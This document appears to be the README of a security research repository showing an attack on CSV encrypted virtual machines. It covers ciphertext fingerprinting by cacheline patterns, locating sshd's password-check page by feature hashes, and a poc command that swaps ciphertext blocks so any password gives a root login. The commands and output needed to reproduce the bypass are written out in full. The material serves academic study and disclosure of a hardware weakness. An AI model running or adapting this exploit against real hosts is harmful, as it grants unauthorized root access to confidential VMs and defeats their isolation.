# CipherShadow-Attack flow


## Memory Ciphertext Data Observation
To better illustrate the issues with CSV memory, this experiment will observe CSV encrypted memory. The design approach is to allocate a memory space on the host, fill it with repeated values using memset, then set the c-bit for encryption and observe the obtained ciphertext.
```
cd Observation_memory && make 
insmod ob.ko
dmesg 
```

Following these commands, you can observe the following memory ciphertext:

```
[343245.634274] [Current Value] 00000000: 6a ae 8c 8a e1 5e f4 cd d5 06 79 c3 49 69 a7 fb  j....^....y.Ii..
[343245.634292] [Current Value] 00000010: 6a ae 8c 8a e1 5e f4 cd d5 06 79 c3 49 69 a7 fb  j....^....y.Ii..
[343245.634298] [Current Value] 00000020: 6a ae 8c 8a e1 5e f4 cd d5 06 79 c3 49 69 a7 fb  j....^....y.Ii..
[343245.634306] [Current Value] 00000030: 6a ae 8c 8a e1 5e f4 cd d5 06 79 c3 49 69 a7 fb  j....^....y.Ii..
[343245.634313] [Current Value] 00000040: 2f 2b 74 7a 8e 2b 6e 33 5b f8 b9 f2 df ef 5a 0e  /+tz.+n3[.....Z.
[343245.634319] [Current Value] 00000050: 2f 2b 74 7a 8e 2b 6e 33 5b f8 b9 f2 df ef 5a 0e  /+tz.+n3[.....Z.
[343245.634325] [Current Value] 00000060: 2f 2b 74 7a 8e 2b 6e 33 5b f8 b9 f2 df ef 5a 0e  /+tz.+n3[.....Z.
[343245.634332] [Current Value] 00000070: 2f 2b 74 7a 8e 2b 6e 33 5b f8 b9 f2 df ef 5a 0e  /+tz.+n3[.....Z.
[343245.634339] [Current Value] 00000080: 54 6a 1f e7 46 5b 50 f4 77 a7 73 52 dc 44 2d f8  Tj..F[P.w.sR.D-.
[343245.634345] [Current Value] 00000090: 54 6a 1f e7 46 5b 50 f4 77 a7 73 52 dc 44 2d f8  Tj..F[P.w.sR.D-.
[343245.634351] [Current Value] 000000a0: 54 6a 1f e7 46 5b 50 f4 77 a7 73 52 dc 44 2d f8  Tj..F[P.w.sR.D-.
[343245.634358] [Current Value] 000000b0: 54 6a 1f e7 46 5b 50 f4 77 a7 73 52 dc 44 2d f8  Tj..F[P.w.sR.D-.
[343245.634364] [Current Value] 000000c0: 8e 7e b0 a7 45 88 97 20 88 16 8b 00 04 f6 fc a7  .~..E.. ........
[343245.634370] [Current Value] 000000d0: 8e 7e b0 a7 45 88 97 20 88 16 8b 00 04 f6 fc a7  .~..E.. ........
[343245.634376] [Current Value] 000000e0: 8e 7e b0 a7 45 88 97 20 88 16 8b 00 04 f6 fc a7  .~..E.. ........
[343245.634382] [Current Value] 000000f0: 8e 7e b0 a7 45 88 97 20 88 16 8b 00 04 f6 fc a7  .~..E.. ........
```

## Fingerprinting

Due to the repetition within a cacheline, CSV exhibits a unique fingerprinting pattern. When assembly code repeats within a 64-byte cacheline, it results in identical ciphertext patterns. This phenomenon can be observed in the following example:

```
0000000000013440 platform_pre_fork:
13440: f3 0f 1e fa
13444: C3
13445: 66 66 2e 0f 1f 84 00
1344c: 00 00 00 00
0000000000013440 platform_pre_restart:
13450: f3 0f 1e fa
13454: e9 d7 59 08 00
13459: 0f 1f 80 00 00 00 00
0000000000013440 platform_post_fork_parent:
13460: f3 0f 1e fa
13464: C3
13465: 66 66 2e 0f 1f 84 00
1346c: 00 00 00 00
0000000000013440 platform_post_fork_child:
13470: f3 0f 1e fa
13474: e9 b7 59 08 00
13479: 0f 1f 80 00 00 00 00
```

For instance, `platform_pre_fork` and `platform_post_fork_parent` contain identical assembly code. In the ciphertext, this 64-byte cacheline exhibits a distinctive pattern where positions 0 and 2 share the same value, and positions 1 and 3 share the same value.

Through systematic analysis, we have identified 15 possible pattern combinations:

```
((0,), (1,), (2,), (3,)),        # All positions unique
((0, 1), (2,), (3,)),            # Positions 0,1 identical
((0, 2), (1,), (3,)),            # Positions 0,2 identical
((0, 3), (1,), (2,)),            # Positions 0,3 identical
((1, 2), (0,), (3,)),            # Positions 1,2 identical
((1, 3), (0,), (2,)),            # Positions 1,3 identical
((2, 3), (0,), (1,)),            # Positions 2,3 identical
((0, 1, 2), (3,)),               # Positions 0,1,2 identical
((0, 1, 3), (2,)),               # Positions 0,1,3 identical
((0, 2, 3), (1,)),               # Positions 0,2,3 identical
((1, 2, 3), (0,)),               # Positions 1,2,3 identical
((0, 1), (2, 3)),                # Positions 0,1 identical and 2,3 identical
((0, 2), (1, 3)),                # Positions 0,2 identical and 1,3 identical
((0, 3), (1, 2)),                # Positions 0,3 identical and 1,2 identical
((0, 1, 2, 3),),                 # All positions identical
```

You can use the `analyze_binary_cacheline_features` function in the `analysis_csv.py` script to extract the feature patterns of a given binary.
If you want to obtain the CSV-specific features, we have implemented a dedicated ioctl in the kernel. By providing a GPA (Guest Physical Address), the kernel will read the ciphertext and perform feature analysis. The corresponding ioctl interface and usage example can be found in `poc.c`.

# End to End attack
Our end-to-end attack flow targets the SSH service, assuming the SSH program is running inside the victim virtual machine. We repeatedly attempt to log in, and before each login, we clear the NX (No-eXecute) bit of certain pages to induce page faults. Each login attempt triggers a page fault; it is important to note that not only the SSH process, but also other system processes may trigger page faults. At this point, we collect the PFN (Page Frame Number) of these pages and extract their ciphertext features to compare with those of the SSHD process. If the target is not found, we use single-step execution to obtain register features, which helps us locate the offset to modify.

```
+-----------------------------+
| Start attack on victim VM   |
+-------------+---------------+
              |
              v
+-----------------------------+
| Attempt SSH login           |
+-------------+---------------+
              |
              v
+-----------------------------+
| Clear NX bit on pages       |
+-------------+---------------+
              |
              v
+-----------------------------+
| Page fault triggered        |
| (by SSH or system process)  |
+-------------+---------------+
              |
              v
+-----------------------------+
| Collect PFN & ciphertext    |
| features of faulting pages  |
+-------------+---------------+
              |
              v
+-----------------------------+
| Compare with SSHD features  |
+-------------+---------------+
        |             |
   [Found]         [Not found]
        |             |
        v             v
+----------------+   +-----------------------------+
| Target page    |   | Use single-step execution   |
| identified     |   | to collect register features|
+----------------+   +-----------------------------+
        |                     |
        v                     v
+-----------------------------+
| Pinpoint offset to modify   |
+-----------------------------+
```

## Step 1: Page Table Localization

To locate page tables, we need to use page faults combined with our memory duplication technique to identify the encrypted memory pages of the SSH program. Using our end-to-end sshd program as an example, after disassembly, we can obtain the following `sys_auth_passwd` assembly code:

```
00000000000132a0 <sys_auth_passwd>:
   132a0:	f3 0f 1e fa          	endbr64 
   132a4:	41 54                	push   %r12
   132a6:	49 89 f4             	mov    %rsi,%r12
   132a9:	55                   	push   %rbp
   132aa:	53                   	push   %rbx
   132ab:	48 8b 9f 60 08 00 00 	mov    0x860(%rdi),%rbx
   132b2:	8b 53 0c             	mov    0xc(%rbx),%edx
   132b5:	48 8b 7b 30          	mov    0x30(%rbx),%rdi
   132b9:	85 d2                	test   %edx,%edx
   132bb:	0f 85 7f 00 00 00    	jne    13340 <sys_auth_passwd+0xa0>
   132c1:	48 8b 6f 08          	mov    0x8(%rdi),%rbp
   132c5:	0f 1f 00             	nopl   (%rax)
   132c8:	48 85 ed             	test   %rbp,%rbp
   132cb:	74 43                	je     13310 <sys_auth_passwd+0x70>
   132cd:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   132d1:	75 4d                	jne    13320 <sys_auth_passwd+0x80>
   132d3:	31 f6                	xor    %esi,%esi
   132d5:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   132da:	74 24                	je     13300 <sys_auth_passwd+0x60>
   132dc:	0f 1f 40 00          	nopl   0x0(%rax)
   132e0:	4c 89 e7             	mov    %r12,%rdi
   132e3:	e8 f8 f4 07 00       	callq  927e0 <xcrypt>
   132e8:	48 89 c7             	mov    %rax,%rdi
   132eb:	48 85 c0             	test   %rax,%rax
   132ee:	74 20                	je     13310 <sys_auth_passwd+0x70>
   132f0:	48 89 ee             	mov    %rbp,%rsi
   132f3:	e8 d8 95 ff ff       	callq  c8d0 <strcmp@plt>
   132f8:	85 c0                	test   %eax,%eax
   132fa:	75 14                	jne    13310 <sys_auth_passwd+0x70>
   132fc:	0f 1f 40 00          	nopl   0x0(%rax)
   13300:	5b                   	pop    %rbx
   13301:	b8 01 00 00 00       	mov    $0x1,%eax
   13306:	5d                   	pop    %rbp
   13307:	41 5c                	pop    %r12
   13309:	c3                   	retq   
   1330a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   13310:	5b                   	pop    %rbx
   13311:	31 c0                	xor    %eax,%eax
   13313:	5d                   	pop    %rbp
   13314:	41 5c                	pop    %r12
   13316:	c3                   	retq   
   13317:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1331e:	00 00 
   13320:	8b 43 0c             	mov    0xc(%rbx),%eax
   13323:	31 f6                	xor    %esi,%esi
   13325:	85 c0                	test   %eax,%eax
   13327:	74 b7                	je     132e0 <sys_auth_passwd+0x40>
   13329:	80 7d 01 00          	cmpb   $0x0,0x1(%rbp)
   1332d:	be 00 00 00 00       	mov    $0x0,%esi
   13332:	48 0f 45 f5          	cmovne %rbp,%rsi
   13336:	eb a8                	jmp    132e0 <sys_auth_passwd+0x40>
   13338:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1333f:	00 
   13340:	e8 6b f4 07 00       	callq  927b0 <shadow_pw>
   13345:	48 89 c5             	mov    %rax,%rbp
   13348:	e9 7b ff ff ff       	jmpq   132c8 <sys_auth_passwd+0x28>
   1334d:	0f 1f 00             	nopl   (%rax)
```

As we can see, we only need to replace the code from addresses 13300-1330a with the code from 13310-1331e to change the login failure logic to login success logic, which sets rax to 1.

Using our tool to scan this program, we discovered that the current page has a unique feature:

```python
bin_path = "/home/pw0rld/security-25/CSV-CipherShadow/CipherShadow-Attack/endtoend/sshd"
page_md5s = analyze_binary_cacheline_features(bin_path)

Result:
Page 19 offset address: 0x13000
Page 19 feature sequence md5: 79bdda39f48c484c47751869c735b2a6
```

This means we only need to find this page's feature in the VM memory and perform the replacement to bypass SSH authentication.

## Attack Example

Execute the `locat_page()` function in `analysis_csv.py`. After completion, you will obtain an `md5.txt` file. Search for the virtual address corresponding to `79bdda39f48c484c47751869c735b2a6` in this file. In our example:

```
Page 0x10daf9000 Feature sequence MD5: 79bdda39f48c484c47751869c735b2a6
```

We can determine that `sys_auth_passwd` is loaded at GPA 0x10daf9000. Through simple address offset calculation:

- Base address: 0x10daf9000
- Offset: 13300 - 13000 = 300
- Result: 0x10daf9000 + 0x300 = 0x10daf9300

Therefore, we need to replace addresses 0x10daf9300 and 0x10daf9310.

Attack command:
```bash
./poc copy16 0x10daf9300 0x10daf9310 0 0
[+]opening /dev/kvm
[+]KVM_COPY_16BYTE_GPA: dst_gpa=0x10daf9310 src_gpa=0x10daf9300
result: 0
```

```bash
➜  CipherShadow-Attack git:(main) ✗ dmesg
[1214578.120351] [+]copy 16byte gpa,dst_gpa 0x10daf9310,src_gpa 0x10daf9300
[1214578.126626] replace data
[1214578.126634] replace_data,from 0x000000010daf9300 to 0x000000010daf9310
[1214578.126638] kvm_amd: src_addrs before [0x000000010daf9300]: c5 3d 48 ae 7a 92 98 af f4 c0 a1 64 29 e1 52 71
[1214578.126644] kvm_amd: dst_addrs before [0x000000010daf9310]: 98 93 a7 80 bf f5 e4 23 f6 61 cb 65 80 b5 61 b7
[1214578.126649] kvm_amd: Finish!
[1214578.126651] kvm_amd: src_addrs after [0x000000010daf9300]: c5 3d 48 ae 7a 92 98 af f4 c0 a1 64 29 e1 52 71
[1214578.126654] kvm_amd: dst_addrs after [0x000000010daf9310]: c5 3d 48 ae 7a 92 98 af f4 c0 a1 64 29 e1 52 71
```

Then test the login:
```bash
➜  CipherShadow-Attack git:(main) ✗ sshpass -p sakldjsakldajs ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2221 root@127.0.0.1
Warning: Permanently added '[127.0.0.1]:2221' (ECDSA) to the list of known hosts.
Last login: Fri Jun 20 11:09:29 2025 from 10.0.2.2
[root@localhost ~]#
```

The login is now successful with any password because the login failure logic has been replaced with success logic.


## Case 2: collect register features
如果遇到不能使用内存特征来定位，我们建议使用single-step获取寄存器的值